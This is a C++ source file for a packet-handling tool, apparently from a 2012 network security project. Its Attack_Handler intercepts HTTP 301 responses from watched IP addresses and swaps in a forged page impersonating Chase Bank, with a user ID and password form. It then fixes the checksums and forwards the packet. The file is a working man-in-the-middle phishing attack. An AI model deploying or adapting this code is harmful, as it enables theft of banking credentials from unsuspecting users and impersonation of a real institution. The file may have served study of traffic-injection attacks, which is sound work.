/*
 * attack_handler.cc
 *
 *  Created on: Nov 27, 2012
 *      Author: philiplundrigan
 */

//sudo LD_LIBRARY_PATH=/usr/local/lib bin/wifu --verbose --config conf/attack.conf --handler attack


#include "attack_handler.h"

#define DEBUG(s) if(verbose_) { cout << s << endl; }

Attack_Handler::Attack_Handler() : watch_list_name_("") {
	DEBUG("Creating Attack Handler");
}

Attack_Handler::~Attack_Handler() {
}

void Attack_Handler::parse_options(int argc, char* const argv[]){
	const char * white_list = "white_list";

	static struct option long_options[] = {
		{white_list, required_argument, NULL, 0},
		{0, 0, 0, 0}
	};

	watch_list_name_ = "watch_list";

	OptionParser options;
	options.parse(argc, argv, long_options);

	if(options.present(white_list)) {
		watch_list_name_ = string(options.argument(white_list));
	}

	DEBUG("White list name set to: " << watch_list_name_);
	load_watch_list();
}

void Attack_Handler::input(IPPacket& p) {

	// if it is not a TCP packet then don't worry about it
	if (p.get_ip_protocol() != TCP) {
		p.accept();
		return;
	}

	TCPPacket packet((Packet &)p, false);
	
	// check if it is an IP address we care about
	// and it is a http response
	if(on_watch_list(packet) && is_http_response(packet)){
		char *temp3 = (char *)packet.get_next_header() + packet.get_tcp_length_bytes();

		if(strncmp(temp3, "HTTP/1.1 301", 12) == 0){

			packet.set_payload_length(1460);
			packet.set_ip_datagram_length(1460);
			DEBUG("Dropping packet");

			TCPPacket new_packet((Packet &)packet, true);

			DEBUG("---------------OLD PAYLOAD----------------------");
			DEBUG(packet.to_s());
			char *temp2 = (char *)packet.get_next_header() + packet.get_tcp_length_bytes();
			DEBUG("Payload: " << temp2);
			DEBUG("------------------------------------------------");
		
			// get the pointer to payload
			char *payload = (char *)new_packet.get_next_header() + new_packet.get_tcp_length_bytes();
		
			string new_html = "HTTP/1.1 200 OK\r\nServer: Apache\r\nDate: Sat, 01 Dec 2012 18:05:58 GMT\r\nContent-Type: text/html\r\nContent-Length:505\r\nConnection: close\r\nVary: Accept-Encoding\r\nExpires: Sat, 01 Dec 2012 18:04:07\r\nCache-Control: no-cache\r\n\r\n<!DOCTYPE html><html><head><title>CHASE Bank</title><style type=\"text/css\">.auto-style1 {font-family: \"Gill Sans\", \"Gill Sans MT\", Calibri, \"Trebuchet MS\", sans-serif;}</style></head><body><h1 class=\"auto-style1\">CHASE Bank</h1><h3>Your Security is our Top Priority</h3><p>Welcome</p><form method=\"post\">User Id <input name=\"Text1\" type=\"text\" /><br />Password <input name=\"Password1\" type=\"password\" /></form><form method=\"post\"><input name=\"Submit1\" type=\"submit\" value=\"submit\" /></form></body></html>";
		
			// change the payload
			strcpy(payload, new_html.c_str());

			new_packet.recalculate_ip_checksum();
			new_packet.recalculate_tcp_checksum();

			DEBUG("---------------NEW PAYLOAD----------------------");
			DEBUG(packet.to_s());
			char *temp = (char *)new_packet.get_next_header() + new_packet.get_tcp_length_bytes();
			DEBUG("Payload: " << temp);
			DEBUG("------------------------------------------------\n\n");
		
			// let the packet through
			new_packet.accept();
		}
		else{
			p.accept();
		}
	}
	else{
		p.accept();
	}
}

void Attack_Handler::load_watch_list(){
	DEBUG("Loading white list");
	string line;

	if(watch_list != NULL){
		delete watch_list;
	}
	watch_list = new set<string>();

	// open file
	ifstream file(watch_list_name_.c_str());
	if (!file.is_open()) {
		cerr << "Can't open " << watch_list_name_ << endl;
		return;
	}

	// parse file
	while (!file.eof()) {
		getline(file,line);
		if ((line == "") || (line[0] == '#')) {
			continue;
		}
		DEBUG("Inserting " << line << " into watch_list");
		watch_list->insert(line);
	}
}

bool Attack_Handler::on_watch_list(TCPPacket p){
	for (set<string>::iterator it = watch_list->begin(); it != watch_list->end(); it++){
		if(*it == p.get_ip_source_address_s()){
			return true;
		}
	}

	return false;
}

bool Attack_Handler::is_http_response(TCPPacket p){
	char *payload = (char *)p.get_next_header() + p.get_tcp_length_bytes();

	if(strncmp(payload, "HTTP", 4) == 0){
		return true;
	}
	else{
		return false;
	}
}
